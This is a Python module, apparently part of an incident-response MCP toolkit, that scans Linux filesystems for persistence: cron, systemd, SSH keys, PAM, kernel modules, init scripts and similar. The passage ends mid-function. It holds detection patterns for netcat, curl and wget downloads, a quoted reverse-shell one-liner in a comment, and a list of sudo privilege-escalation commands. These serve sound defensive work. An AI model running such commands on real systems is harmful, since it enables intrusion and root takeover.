"""
Linux persistence-mechanism scanner.

Attackers who gain a foothold on a Linux host almost always plant
persistence so they survive reboots, credential rotations, or service
restarts. This module exposes focused MCP tools that scan a filesystem
(a live root, a mounted disk image, or a sample tree) for the common
classes of persistence observed in real intrusions.

Each scan returns a list of findings with:
- severity (high / medium / low)
- category (cron, systemd, ssh, user, shell, library, init)
- path relative to the scan root
- reasons — plain-English explanations of why the artifact was flagged
- sample — a short excerpt of the offending content

The design goal is that Claude can reason about findings without parsing
raw config files in its context window. Heuristics intentionally err
on the side of surfacing borderline items; we mark confidence so the
agent can distinguish "definitely malicious" from "worth checking."
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from pathlib import Path

from findevil.server import _audit, _validate_evidence_path, mcp

# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------


@dataclass
class PersistenceFinding:
    """A single persistence-related observation from the filesystem scan."""

    category: str
    severity: str  # "high" | "medium" | "low" | "info"
    path: str
    summary: str
    reasons: list[str] = field(default_factory=list)
    sample: str = ""


# ---------------------------------------------------------------------------
# Heuristics used across scanners
# ---------------------------------------------------------------------------

# Commands / patterns that are suspicious when they appear in persistence files
_SUSPICIOUS_CMD_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    # curl/wget followed (eventually) by http(s) URL — tolerate flags like `-s`
    (re.compile(r"\b(curl|wget)\b.*?https?://", re.I), "outbound download"),
    (re.compile(r"\b(nc|netcat|ncat|socat)\b"), "network listener / reverse shell tool"),
    (re.compile(r"bash\s+-[ic]\s*.*[;|]"), "inline shell execution"),
    # World-writable paths — match as substring (no word boundary; the first
    # char could be `/`, `(`, `=`, or whitespace in practice).
    (re.compile(r"/tmp/|/var/tmp/|/dev/shm/"), "executes from world-writable dir"),
    (re.compile(r"base64\s+-d|eval\s*\(|python\s+-c"), "obfuscated execution"),
    (re.compile(r"chattr\s+\+i"), "immutable flag (anti-removal)"),
    (re.compile(r"iptables.*-F|ufw\s+disable"), "firewall tampering"),
    (re.compile(r"systemctl\s+(stop|disable).*(auditd|rsyslog|syslog)"), "logging tampering"),
    (re.compile(r"^\s*[^#].*\.onion", re.M), "tor address"),
    # Common hostile subnets (examples; not exhaustive). Only triggers on
    # the leading octets we've listed in active IR cases.
    (re.compile(r"\b(185|45|91|194)\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"), "non-RFC1918 IP in config"),
]


# Base64 blobs of 40+ chars are long enough to encode a meaningful command
# (`echo "bash -i >& /dev/tcp/1.2.3.4/443 0>&1" | base64` produces 56 chars).
# Anything shorter is too short to be a hidden payload worth decoding.
# Tolerate URL-safe variants (`-` and `_`) and missing padding.
_BASE64_BLOB_RE = re.compile(r"\b[A-Za-z0-9+/_-]{40,}={0,2}\b")


def _try_decode_b64(blob: str) -> str:
    """Best-effort base64 decode. Returns empty string on any failure.

    Tries both standard and URL-safe alphabets, and pads if needed —
    real attacker payloads sometimes drop trailing `=`.
    """
    for alphabet in ("standard", "urlsafe"):
        s = blob
        # Pad to multiple of 4
        s += "=" * (-len(s) % 4)
        try:
            if alphabet == "standard":
                raw = base64.b64decode(s, validate=False)
            else:
                raw = base64.urlsafe_b64decode(s)
        except (ValueError, base64.binascii.Error):
            continue
        try:
            text = raw.decode("utf-8", errors="strict")
        except UnicodeDecodeError:
            continue
        # Heuristic: real shell payloads contain printable chars + at least
        # one of the suspicious tokens. A random binary blob that happens to
        # decode without error will rarely match.
        printable_ratio = sum(1 for c in text if c.isprintable() or c in "\n\r\t") / max(1, len(text))
        if printable_ratio < 0.85:
            continue
        return text
    return ""


def _match_suspicious(text: str) -> list[str]:
    """Return list of reason-labels for any suspicious patterns matched in `text`.

    Two-pass match:
    1. Direct regex match against `_SUSPICIOUS_CMD_PATTERNS`.
    2. Find base64 blobs in `text`, decode them, re-run the same patterns
       against the decoded content. Any match in pass 2 is annotated with
       "(decoded from base64)" so the agent knows the signal was hidden
       behind encoding — matching what real evasion (S09) looks like.
    """
    matched: list[str] = []
    for pat, label in _SUSPICIOUS_CMD_PATTERNS:
        if pat.search(text):
            matched.append(label)
    # Pass 2: decode and re-match. Bound the number of blobs we try so a
    # giant config full of base64-shaped strings doesn't trigger O(n) decodes.
    for blob in _BASE64_BLOB_RE.findall(text)[:10]:
        decoded = _try_decode_b64(blob)
        if not decoded:
            continue
        for pat, label in _SUSPICIOUS_CMD_PATTERNS:
            if pat.search(decoded):
                hidden_label = f"{label} (decoded from base64)"
                if hidden_label not in matched:
                    matched.append(hidden_label)
    return matched


def _read_safe(path: Path, max_bytes: int = 65536) -> str:
    """Read a file with size cap and error tolerance."""
    try:
        with path.open("rb") as f:
            data = f.read(max_bytes)
        return data.decode(errors="replace")
    except (OSError, PermissionError) as e:
        return f"[unreadable: {e}]"


def _rel(root: Path, path: Path) -> str:
    try:
        return str(path.relative_to(root))
    except ValueError:
        return str(path)


# ---------------------------------------------------------------------------
# Cron persistence
# ---------------------------------------------------------------------------


def scan_cron(root: Path) -> list[PersistenceFinding]:
    """Scan cron directories and crontab files for persistence."""
    findings: list[PersistenceFinding] = []
    cron_targets = [
        root / "etc" / "crontab",
        *(root / "etc").glob("cron.d/*"),
        *(root / "etc").glob("cron.hourly/*"),
        *(root / "etc").glob("cron.daily/*"),
        *(root / "etc").glob("cron.weekly/*"),
        *(root / "etc").glob("cron.monthly/*"),
        *(root / "var/spool/cron").rglob("*"),
    ]

    for p in cron_targets:
        if not p.is_file():
            continue
        content = _read_safe(p)
        reasons = _match_suspicious(content)
        severity = "high" if reasons else "info"
        summary = (
            "Suspicious cron entry" if reasons else "Cron file present (not obviously malicious)"
        )
        findings.append(
            PersistenceFinding(
                category="cron",
                severity=severity,
                path=_rel(root, p),
                summary=summary,
                reasons=reasons,
                sample=content[:500].rstrip(),
            )
        )
    return findings


# ---------------------------------------------------------------------------
# systemd unit persistence
# ---------------------------------------------------------------------------


_SYSTEMD_EXEC_RE = re.compile(r"^\s*ExecStart(?:Pre|Post)?\s*=\s*(.+)$", re.M)
_SYSTEMD_USER_RE = re.compile(r"^\s*User\s*=\s*(\S+)", re.M)


def scan_systemd(root: Path) -> list[PersistenceFinding]:
    """Scan systemd unit directories for rogue or tampered services/timers."""
    findings: list[PersistenceFinding] = []
    unit_dirs = [
        root / "etc/systemd/system",
        root / "usr/lib/systemd/system",
        root / "lib/systemd/system",
    ]
    user_unit_dirs = list((root / "home").glob("*/.config/systemd/user")) + list(
        (root / "root").glob(".config/systemd/user")
    )

    for ud in unit_dirs + user_unit_dirs:
        if not ud.is_dir():
            continue
        for unit in sorted(ud.rglob("*")):
            if not unit.is_file():
                continue
            if unit.suffix not in (".service", ".timer", ".socket", ".path"):
                continue

            content = _read_safe(unit)
            exec_lines = _SYSTEMD_EXEC_RE.findall(content)
            user_line = _SYSTEMD_USER_RE.search(content)

            reasons: list[str] = []
            for exec_cmd in exec_lines:
                reasons.extend(_match_suspicious(exec_cmd))

            # Additional red flags specific to systemd
            if user_line and user_line.group(1) == "root":
                # Running as root is normal for system units but noteworthy in /home.
                # Compare path components, not the stringified prefix — `/homeless/`
                # would otherwise match `/home`.
                if ud.is_relative_to(root / "home"):
                    reasons.append("user unit runs as root")

            # Dedupe reasons while preserving order
            reasons = list(dict.fromkeys(reasons))

            severity = "high" if reasons else "info"
            summary = (
                "Suspicious systemd unit"
                if reasons
                else "systemd unit present (not obviously malicious)"
            )

            findings.append(
                PersistenceFinding(
                    category="systemd",
                    severity=severity,
                    path=_rel(root, unit),
                    summary=summary,
                    reasons=reasons,
                    sample=content[:500].rstrip(),
                )
            )
    return findings


# ---------------------------------------------------------------------------
# SSH authorized_keys persistence
# ---------------------------------------------------------------------------


_KEY_LINE_RE = re.compile(
    r"^\s*(?P<opts>[^ \t]*(?:=\"[^\"]*\"[^ \t]*)*)?\s*"
    r"(?P<type>ssh-\S+|ecdsa-\S+|sk-\S+)\s+"
    r"(?P<data>[A-Za-z0-9+/=]+)"
    r"(?:\s+(?P<comment>.*))?$"
)


def scan_authorized_keys(root: Path) -> list[PersistenceFinding]:
    """Enumerate authorized_keys files and flag unusual entries."""
    findings: list[PersistenceFinding] = []
    candidates = [
        root / "root/.ssh/authorized_keys",
        *(root / "home").glob("*/.ssh/authorized_keys"),
        root / "etc/ssh/authorized_keys",
    ]

    for p in candidates:
        if not p.is_file():
            continue

        content = _read_safe(p)
        lines = [line for line in content.splitlines() if line.strip() and not line.startswith("#")]

        per_key_reasons: list[tuple[str, list[str]]] = []
        for line in lines:
            m = _KEY_LINE_RE.match(line)
            reasons = []
            if not m:
                reasons.append("unparseable key line")
            else:
                comment = (m.group("comment") or "").strip()
                key_type = m.group("type")
                opts = (m.group("opts") or "").strip()
                if not comment:
                    reasons.append("no key comment (often a telltale for planted keys)")
                if key_type in ("ssh-dss", "ecdsa-sha2-nistp256"):
                    reasons.append(f"weak / deprecated key type: {key_type}")
                if opts and ("command=" in opts or "no-port-forwarding" not in opts):
                    reasons.append(f"key options present: {opts[:80]}")
            per_key_reasons.append((line[:120], reasons))

        flagged = [pk for pk in per_key_reasons if pk[1]]
        reasons_for_file = []
        if flagged:
            reasons_for_file.append(f"{len(flagged)}/{len(per_key_reasons)} key(s) flagged")
        # Heuristic: multiple keys in /root is unusual. Match exactly against
        # the canonical /root/.ssh/authorized_keys path — a substring check
        # like `"root" in str(p)` would also flag /home/groot/.ssh/...
        if len(per_key_reasons) >= 2 and p == root / "root/.ssh/authorized_keys":
            reasons_for_file.append(
                f"root has {len(per_key_reasons)} authorized keys — inspect for lateral-movement backdoor"
            )

        sample_lines = []
        for line, reasons in per_key_reasons[:10]:
            if reasons:
                sample_lines.append(f"⚠ {line}  — {'; '.join(reasons)}")
            else:
                sample_lines.append(f"  {line}")

        severity = "high" if flagged else ("medium" if reasons_for_file else "info")
        summary = f"{len(per_key_reasons)} SSH key(s) in {_rel(root, p)}"
        findings.append(
            PersistenceFinding(
                category="ssh",
                severity=severity,
                path=_rel(root, p),
                summary=summary,
                reasons=reasons_for_file,
                sample="\n".join(sample_lines),
            )
        )
    return findings


# ---------------------------------------------------------------------------
# Anomalous users / shadow entries
# ---------------------------------------------------------------------------


def _parse_passwd(content: str) -> list[dict[str, str]]:
    entries = []
    for line_number, line in enumerate(content.splitlines(), 1):
        if not line.strip() or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) < 7:
            continue
        entries.append(
            {
                "line": str(line_number),
                "username": parts[0],
                "uid": parts[2],
                "gid": parts[3],
                "gecos": parts[4],
                "home": parts[5],
                "shell": parts[6],
                "raw": line,
            }
        )
    return entries


def _parse_shadow(content: str) -> dict[str, str]:
    """Map username → password field from /etc/shadow."""
    entries = {}
    for line in content.splitlines():
        if not line.strip() or line.startswith("#"):
            continue
        parts = line.split(":")
        if len(parts) >= 2:
            entries[parts[0]] = parts[1]
    return entries


_INTERACTIVE_SHELLS = {"/bin/bash", "/bin/sh", "/bin/zsh", "/bin/dash", "/bin/ash", "/usr/bin/bash"}


def scan_users(root: Path) -> list[PersistenceFinding]:
    """Look for anomalous /etc/passwd entries and empty shadow passwords."""
    findings: list[PersistenceFinding] = []
    passwd_path = root / "etc/passwd"
    shadow_path = root / "etc/shadow"

    if not passwd_path.is_file():
        return findings

    passwd_entries = _parse_passwd(_read_safe(passwd_path))
    shadow_map = _parse_shadow(_read_safe(shadow_path)) if shadow_path.is_file() else {}

    for entry in passwd_entries:
        reasons = []
        uid = entry["uid"]
        username = entry["username"]
        shell = entry["shell"]

        # UID 0 accounts other than root
        if uid == "0" and username != "root":
            reasons.append(f"UID 0 account '{username}' (not root) — classic root-equivalent backdoor")

        # Interactive shell on normally-system accounts
        if shell in _INTERACTIVE_SHELLS and username in {"www-data", "nobody", "daemon", "bin", "sys"}:
            reasons.append(f"system account '{username}' has interactive shell: {shell}")

        # Empty or blank password in shadow
        if username in shadow_map:
            pw = shadow_map[username]
            if pw == "" or pw == "::":
                reasons.append(f"account '{username}' has EMPTY password in shadow")
            elif pw == "*" or pw == "!":
                pass  # locked, fine
            # else: hashed password, fine

        if reasons:
            findings.append(
                PersistenceFinding(
                    category="user",
                    severity="high",
                    path=f"etc/passwd:{entry['line']}",
                    summary=f"Anomalous account: {username} (uid={uid})",
                    reasons=reasons,
                    sample=entry["raw"],
                )
            )

    return findings


# ---------------------------------------------------------------------------
# Shell init files
# ---------------------------------------------------------------------------


def scan_shell_init(root: Path) -> list[PersistenceFinding]:
    """Scan user shell init files (.bashrc, .profile, .bash_profile, .zshrc)."""
    findings: list[PersistenceFinding] = []
    init_names = [".bashrc", ".bash_profile", ".profile", ".zshrc", ".bash_login", ".bash_logout"]

    targets: list[Path] = []
    for name in init_names:
        targets.append(root / "root" / name)
        targets.extend((root / "home").glob(f"*/{name}"))
    # /etc/profile.d and global shells
    targets.append(root / "etc/profile")
    targets.append(root / "etc/bash.bashrc")
    profile_d = root / "etc/profile.d"
    if profile_d.is_dir():
        targets.extend(profile_d.glob("*"))

    for p in targets:
        if not p or not p.is_file():
            continue
        content = _read_safe(p)
        reasons = _match_suspicious(content)
        severity = "high" if reasons else "info"
        summary = (
            "Shell init contains suspicious commands"
            if reasons
            else "Shell init present (not obviously malicious)"
        )
        findings.append(
            PersistenceFinding(
                category="shell",
                severity=severity,
                path=_rel(root, p),
                summary=summary,
                reasons=reasons,
                sample=content[:400].rstrip(),
            )
        )
    return findings


# ---------------------------------------------------------------------------
# Library preload persistence (LD_PRELOAD / ld.so.preload rootkits)
# ---------------------------------------------------------------------------


def scan_library_preload(root: Path) -> list[PersistenceFinding]:
    """Check /etc/ld.so.preload and LD_PRELOAD in /etc/environment."""
    findings: list[PersistenceFinding] = []
    preload = root / "etc/ld.so.preload"
    if preload.is_file():
        content = _read_safe(preload).strip()
        if content:
            reasons = ["ld.so.preload is nonempty — every dynamically linked process loads this library"]
            # Known rootkit names
            rootkit_names = ["libprocesshider", "libkeylogger", "libhook", "libpandora"]
            for name in rootkit_names:
                if name in content:
                    reasons.append(f"known rootkit library name detected: {name}")
            findings.append(
                PersistenceFinding(
                    category="library",
                    severity="high",
                    path=_rel(root, preload),
                    summary="Global library preload configured",
                    reasons=reasons,
                    sample=content[:400],
                )
            )

    envfile = root / "etc/environment"
    if envfile.is_file():
        content = _read_safe(envfile)
        if "LD_PRELOAD" in content:
            findings.append(
                PersistenceFinding(
                    category="library",
                    severity="high",
                    path=_rel(root, envfile),
                    summary="LD_PRELOAD set globally via /etc/environment",
                    reasons=["LD_PRELOAD in /etc/environment affects all user logins"],
                    sample=content[:400],
                )
            )
    return findings


# ---------------------------------------------------------------------------
# SysV init / rc.local persistence
# ---------------------------------------------------------------------------


# Names of init.d scripts shipped by stock Debian/Ubuntu (and the most common
# server packages). Anything else in /etc/init.d/ is worth surfacing — many
# real Linux malware families (Mirai, BPFDoor, HiddenWasp) persist there
# precisely because admins rarely audit it.
_STOCK_INITD_SCRIPTS = {
    "skeleton", "rc", "rcS", "rc.local", "single", "halt", "reboot",
    "networking", "rsyslog", "ssh", "sshd", "cron", "console-setup",
    "udev", "udev-finish", "x11-common", "kmod", "lvm2", "alsa-utils",
    "apparmor", "apport", "atd", "bind9", "binfmt-support", "bluetooth",
    "console-screen.sh", "cpufrequtils", "cups", "dbus", "exim4",
    "fail2ban", "kbd", "keyboard-setup.sh", "kerneloops", "lightdm",
    "loadcpufreq", "memcached", "mdadm", "mongodb", "mysql", "named",
    "nginx", "ntp", "openvpn", "ondemand", "openssh-server", "plymouth",
    "plymouth-log", "postfix", "postgresql", "procps", "pulseaudio",
    "rabbitmq-server", "rsync", "samba", "saned", "screen-cleanup",
    "speech-dispatcher", "sudo", "supervisor", "syslog",
    "systemd-helpers", "ufw", "unattended-upgrades", "urandom", "uuidd",
    "vsftpd", "watchdog", "xinetd", "zfs-fuse", "zfs-zed",
    "anacron", "cron-apt", "checkfs.sh", "checkroot.sh", "checkroot-bootclean.sh",
    "mountall.sh", "mountall-bootclean.sh", "mountkernfs.sh", "mountnfs.sh",
    "mountnfs-bootclean.sh", "mountdevsubfs.sh", "mtab.sh", "umountfs",
    "umountnfs.sh", "umountroot", "killprocs", "sendsigs", "hostname.sh",
    "hwclock.sh", "bootmisc.sh", "console-getty",
}


def scan_init(root: Path) -> list[PersistenceFinding]:
    """Scan SysV-init persistence: /etc/rc.local and /etc/init.d/*.

    /etc/init.d/ is a recurring foothold for Linux malware (Mirai planted
    `/etc/init.d/watchdog-init`-style scripts; BPFDoor uses init.d wrappers
    around its /dev/shm binary; HiddenWasp drops `/etc/init.d/idata`).
    Scanning rc.local alone misses all of these.
    """
    findings: list[PersistenceFinding] = []

    rc = root / "etc/rc.local"
    if rc.is_file():
        content = _read_safe(rc)
        reasons = _match_suspicious(content)
        if reasons:
            findings.append(
                PersistenceFinding(
                    category="init",
                    severity="high",
                    path=_rel(root, rc),
                    summary="rc.local contains suspicious commands",
                    reasons=reasons,
                    sample=content[:400],
                )
            )

    init_d = root / "etc/init.d"
    if init_d.is_dir():
        for script in sorted(init_d.iterdir()):
            if not script.is_file():
                continue
            if script.name in _STOCK_INITD_SCRIPTS:
                continue
            content = _read_safe(script)
            reasons = _match_suspicious(content)
            # Direct exec from world-writable paths is a strong signal even
            # if no other suspicious heuristic fires (e.g., BPFDoor wrapper:
            # `exec /dev/shm/kdmtmpflush &`).
            if re.search(r"(?:^|\s)/(?:tmp|dev/shm|var/tmp)/\S+", content):
                reasons.append("init.d script execs from world-writable path")
            # Non-stock init.d scripts deserve at least a note even if no
            # heuristic fires — third-party services can be legitimate
            # but in IR we want to see them all.
            severity = "high" if reasons else "medium"
            summary = (
                f"Suspicious init.d script: {script.name}"
                if reasons
                else f"Non-stock init.d script: {script.name}"
            )
            if not reasons:
                reasons = [
                    f"`{script.name}` is not a known stock distribution init script"
                    " — verify provenance",
                ]
            findings.append(
                PersistenceFinding(
                    category="init",
                    severity=severity,
                    path=_rel(root, script),
                    summary=summary,
                    reasons=list(dict.fromkeys(reasons)),
                    sample=content[:500].rstrip(),
                )
            )

    return findings


def scan_devshm_executables(root: Path) -> list[PersistenceFinding]:
    """Flag executables in /dev/shm — common Linux-malware staging path.

    /dev/shm is a tmpfs mount intended for shared memory IPC, not binaries.
    BPFDoor (PwC 2022) drops its passive backdoor at /dev/shm/kdmtmpflush;
    other Linux malware families use /dev/shm to evade tools that don't
    enumerate it. Any executable file here is worth surfacing for IR.
    """
    findings: list[PersistenceFinding] = []
    devshm = root / "dev/shm"
    if not devshm.is_dir():
        return findings
    for p in devshm.rglob("*"):
        if not p.is_file():
            continue
        try:
            head = p.open("rb").read(4)
        except (OSError, PermissionError):
            continue
        is_elf = head == b"\x7fELF"
        is_script = head.startswith(b"#!")
        try:
            executable = bool(p.stat().st_mode & 0o111)
        except OSError:
            executable = False
        if not (is_elf or is_script or executable):
            continue
        kind = "ELF binary" if is_elf else ("script" if is_script else "executable")
        try:
            size = p.stat().st_size
        except OSError:
            size = 0
        findings.append(
            PersistenceFinding(
                category="devshm",
                severity="high",
                path=_rel(root, p),
                summary=f"{kind} in /dev/shm: {p.name}",
                reasons=[
                    "files in /dev/shm are almost never legitimate; common Linux-malware"
                    " staging path (BPFDoor and others)",
                    f"file is a {kind} ({size} bytes)",
                ],
                sample=f"{p} ({size} bytes)",
            )
        )
    return findings


# ---------------------------------------------------------------------------
# PAM module tampering
# ---------------------------------------------------------------------------
#
# Attackers modify /etc/pam.d/* (classic: pam_exec invocations that run an
# arbitrary command at every auth, effectively giving credential capture
# and persistence in one move) OR drop malicious .so files in
# /lib/*/security/ that Linux loads during PAM evaluation.


_STOCK_PAM_MODULES = {
    "pam_unix.so", "pam_deny.so", "pam_permit.so", "pam_env.so",
    "pam_keyinit.so", "pam_limits.so", "pam_mail.so", "pam_motd.so",
    "pam_cap.so", "pam_nologin.so", "pam_loginuid.so", "pam_lastlog.so",
    "pam_succeed_if.so", "pam_umask.so", "pam_systemd.so", "pam_faillock.so",
    "pam_faildelay.so", "pam_rootok.so", "pam_selinux.so", "pam_ecryptfs.so",
    "pam_mkhomedir.so", "pam_sss.so", "pam_gnome_keyring.so", "pam_passwdqc.so",
    "pam_pwquality.so", "pam_access.so", "pam_cracklib.so", "pam_group.so",
    "pam_time.so", "pam_winbind.so", "pam_ldap.so", "pam_krb5.so",
    "pam_oddjob_mkhomedir.so", "pam_namespace.so", "pam_securetty.so",
    "pam_issue.so", "pam_tty_audit.so", "pam_unix_session.so",
    "pam_extrausers.so",
}


def scan_pam(root: Path) -> list[PersistenceFinding]:
    """Scan /etc/pam.d/* for tampering and /lib/*/security/ for unknown modules.

    Red flags:
    - `pam_exec.so` directives that invoke external binaries in world-writable
      or user home directories (classic credential-capture trick)
    - `auth sufficient pam_X.so` where pam_X is not a stock module name
    - Unknown .so files present in /lib/*/security/ that aren't in the stock set
    """
    findings: list[PersistenceFinding] = []

    pam_d = root / "etc/pam.d"
    if pam_d.is_dir():
        for conf in sorted(pam_d.iterdir()):
            if not conf.is_file():
                continue
            content = _read_safe(conf)
            reasons: list[str] = []
            for line in content.splitlines():
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                # pam_exec directives that run external scripts
                if "pam_exec.so" in s:
                    # the argument after pam_exec.so is typically the command/script path
                    cmd_match = re.search(r"pam_exec\.so\s+(?:\S+\s+)*(/\S+)", s)
                    cmd = cmd_match.group(1) if cmd_match else ""
                    if cmd:
                        if "/tmp/" in cmd or "/var/tmp/" in cmd or "/dev/shm/" in cmd:
                            reasons.append(f"pam_exec invokes world-writable path: {cmd}")
                        elif "/home/" in cmd:
                            reasons.append(f"pam_exec invokes user home path: {cmd}")
                        else:
                            reasons.append(f"pam_exec directive present: {cmd}")
                # Non-stock module reference
                mod_match = re.search(r"(pam_\w+\.so)", s)
                if mod_match:
                    mod = mod_match.group(1)
                    if mod not in _STOCK_PAM_MODULES:
                        reasons.append(f"non-stock PAM module referenced: {mod}")

            if reasons:
                findings.append(
                    PersistenceFinding(
                        category="pam",
                        severity="high",
                        path=_rel(root, conf),
                        summary=f"PAM tampering in {conf.name}",
                        reasons=list(dict.fromkeys(reasons)),
                        sample=content[:500].rstrip(),
                    )
                )

    # Unknown modules in /lib/*/security/
    for sec_dir in (root / "lib").rglob("security"):
        if not sec_dir.is_dir():
            continue
        for so in sec_dir.glob("*.so"):
            if so.name not in _STOCK_PAM_MODULES:
                findings.append(
                    PersistenceFinding(
                        category="pam",
                        severity="high",
                        path=_rel(root, so),
                        summary=f"Unknown PAM .so module: {so.name}",
                        reasons=["module name is not in the stock PAM module set"],
                        sample=f"{so} ({so.stat().st_size} bytes)" if so.exists() else "",
                    )
                )
    return findings


# ---------------------------------------------------------------------------
# Kernel module persistence (/etc/modules, /etc/modprobe.d/)
# ---------------------------------------------------------------------------


# Modules Debian/Ubuntu commonly ship in the default /etc/modules. Additions
# outside this set on a normal web server are at least worth surfacing.
_COMMON_KERNEL_MODULES = {
    # Storage / filesystems
    "loop", "dm_mod", "dm_crypt", "aes", "nfs", "nfsv3", "nfsv4",
    "cifs", "ntfs", "vfat", "fuse", "overlay", "raid0", "raid1",
    # Network
    "ipv6", "ip_tables", "iptable_nat", "iptable_filter", "nf_nat",
    "bridge", "bonding", "vxlan", "8021q",
    # Crypto
    "aesni_intel", "cryptd", "rng_core",
    # Common hardware (VMs + baremetal)
    "virtio_net", "virtio_blk", "virtio_scsi", "virtio_pci",
    "e1000", "e1000e", "ixgbe",
    # Misc
    "zram", "tcp_bbr", "tcp_cubic",
}


def scan_kernel_modules(root: Path) -> list[PersistenceFinding]:
    """Scan kernel-module persistence paths for unusual entries."""
    findings: list[PersistenceFinding] = []

    # /etc/modules: list of modules to load at boot
    mods_file = root / "etc/modules"
    if mods_file.is_file():
        content = _read_safe(mods_file)
        unknown: list[str] = []
        for line in content.splitlines():
            name = line.strip()
            if not name or name.startswith("#"):
                continue
            # Split on whitespace, first token is the module name
            mod = name.split()[0]
            if mod not in _COMMON_KERNEL_MODULES:
                unknown.append(mod)
        if unknown:
            findings.append(
                PersistenceFinding(
                    category="kernel_module",
                    severity="high",
                    path=_rel(root, mods_file),
                    summary=f"{len(unknown)} non-stock module(s) set to load at boot",
                    reasons=[
                        f"module `{m}` is not in the common module set — verify provenance"
                        for m in unknown[:10]
                    ],
                    sample=content[:400],
                )
            )

    # /etc/modprobe.d/*.conf — aliases, options, blacklists
    modprobe_d = root / "etc/modprobe.d"
    if modprobe_d.is_dir():
        for conf in sorted(modprobe_d.iterdir()):
            if not conf.is_file() or not conf.name.endswith(".conf"):
                continue
            content = _read_safe(conf)
            reasons: list[str] = []
            for line in content.splitlines():
                s = line.strip()
                if not s or s.startswith("#"):
                    continue
                # Install directives that run shell commands
                if s.startswith("install ") and "/bin/" in s:
                    reasons.append(f"install directive runs shell: `{s[:120]}`")
                # Blacklists of security modules
                if s.startswith("blacklist "):
                    m = s.split()[1] if len(s.split()) > 1 else ""
                    if m in ("audit", "tcp_diag", "apparmor", "selinux"):
                        reasons.append(f"blacklisting security-relevant module: {m}")
            if reasons:
                findings.append(
                    PersistenceFinding(
                        category="kernel_module",
                        severity="high",
                        path=_rel(root, conf),
                        summary=f"Suspicious modprobe config: {conf.name}",
                        reasons=list(dict.fromkeys(reasons)),
                        sample=content[:500],
                    )
                )

    # /lib/modules/*/extra/*.ko — out-of-tree kernel modules. Distribution
    # packages place modules under .../kernel/, never under .../extra/, so
    # any .ko file here was added outside the package manager. Diamorphine
    # (a widely-used open-source LKM rootkit) installs to this path.
    lib_modules = root / "lib/modules"
    if lib_modules.is_dir():
        for kernel_ver_dir in lib_modules.iterdir():
            if not kernel_ver_dir.is_dir():
                continue
            extra = kernel_ver_dir / "extra"
            if not extra.is_dir():
                continue
            for ko in sorted(extra.rglob("*.ko")):
                try:
                    size = ko.stat().st_size
                except OSError:
                    size = 0
                findings.append(
                    PersistenceFinding(
                        category="kernel_module",
                        severity="high",
                        path=_rel(root, ko),
                        summary=f"Out-of-tree kernel module: {ko.name}",
                        reasons=[
                            f"`{ko.name}` is in /lib/modules/{kernel_ver_dir.name}/extra/"
                            " — outside the distribution package",
                            "verify provenance against dpkg/rpm; common location for"
                            " open-source LKM rootkits like Diamorphine",
                        ],
                        sample=f"{ko} ({size} bytes)",
                    )
                )
    return findings


# ---------------------------------------------------------------------------
# sshd_config — server SSH configuration
# ---------------------------------------------------------------------------
#
# Attackers don't usually modify sshd_config themselves (it requires a
# daemon reload and is often monitored), but they absolutely exploit
# pre-existing misconfigurations. For an IR investigation, flagging
# dangerous sshd settings explains HOW the initial access succeeded.


_SSHD_DIRECTIVE = re.compile(r"^\s*(\S+)\s+(.+?)\s*$")


def _parse_sshd_config(content: str) -> dict[str, str]:
    settings: dict[str, str] = {}
    for line in content.splitlines():
        s = line.split("#", 1)[0].strip()
        if not s:
            continue
        m = _SSHD_DIRECTIVE.match(s)
        if m:
            # Last occurrence wins (OpenSSH semantics for top-level directives)
            settings[m.group(1)] = m.group(2).strip()
    return settings


def scan_ssh_config(root: Path) -> list[PersistenceFinding]:
    """Flag dangerous /etc/ssh/sshd_config settings."""
    findings: list[PersistenceFinding] = []
    cfg = root / "etc/ssh/sshd_config"
    if not cfg.is_file():
        return findings

    content = _read_safe(cfg)
    settings = _parse_sshd_config(content)
    reasons: list[str] = []

    root_login = settings.get("PermitRootLogin", "prohibit-password").lower()
    if root_login in ("yes", "without-password"):
        if root_login == "yes":
            reasons.append("PermitRootLogin yes — root can log in with a PASSWORD over SSH")
        else:
            reasons.append("PermitRootLogin without-password — root can log in with a key (reduce surface by disabling root login entirely)")

    if settings.get("PasswordAuthentication", "yes").lower() == "yes":
        # Default is yes, but many orgs explicitly disable. If deploy/alice/bob
        # all use publickey, password auth is an unnecessary attack surface.
        reasons.append("PasswordAuthentication yes — password-based login is enabled (prefer key-only)")

    if settings.get("PermitEmptyPasswords", "no").lower() == "yes":
        reasons.append("PermitEmptyPasswords yes — logins with empty passwords are permitted")

    if settings.get("HostBasedAuthentication", "no").lower() == "yes":
        reasons.append("HostBasedAuthentication yes — host-based trust is a lateral-movement enabler")

    if settings.get("PermitUserEnvironment", "no").lower() == "yes":
        reasons.append("PermitUserEnvironment yes — users can set env vars that influence server behavior")

    if settings.get("Protocol", "2") == "1":
        reasons.append("Protocol 1 — obsolete and insecure")

    if reasons:
        findings.append(
            PersistenceFinding(
                category="ssh_config",
                severity="high",
                path=_rel(root, cfg),
                summary=f"Dangerous sshd_config ({len(reasons)} finding(s))",
                reasons=reasons,
                sample=content[:500].rstrip(),
            )
        )
    return findings


# ---------------------------------------------------------------------------
# sudoers — privilege escalation surface
# ---------------------------------------------------------------------------


# Commands that GTFOBins and similar research identify as trivial privilege-
# escalation vectors when given sudo NOPASSWD. Not exhaustive; covers the
# highest-impact cases seen in Linux IR incidents.
_DANGEROUS_NOPASSWD_CMDS = {
    "vim", "vi", "nano", "emacs",  # shell escapes (:!bash)
    "less", "more", "man",  # shell escapes (!bash)
    "find",  # -exec /bin/sh
    "awk", "sed",  # -e subshells
    "python", "python3", "perl", "ruby", "node", "nodejs",  # arbitrary code
    "bash", "sh", "zsh", "dash",  # literal shell
    "env",  # can exec anything
    "docker",  # mount host root
    "systemctl",  # can add a root-running service
    "tar",  # --to-command=
    "tee",  # can write to /etc/shadow, etc.
    "dd",  # can write anywhere
    "cp", "mv",  # can overwrite system files
    "chown", "chmod",  # can grant themselves access
    "apt", "apt-get", "dpkg", "yum", "dnf",  # can install a rogue package
    "pip", "pip3", "npm",  # can install a rogue module
}


def _strip_comment(line: str) -> str:
    # Escape-aware would be ideal; for IR use cases simple split is enough.
    return line.split("#", 1)[0].rstrip()


def _parse_sudoers_line(line: str) -> tuple[str, str, str] | None:
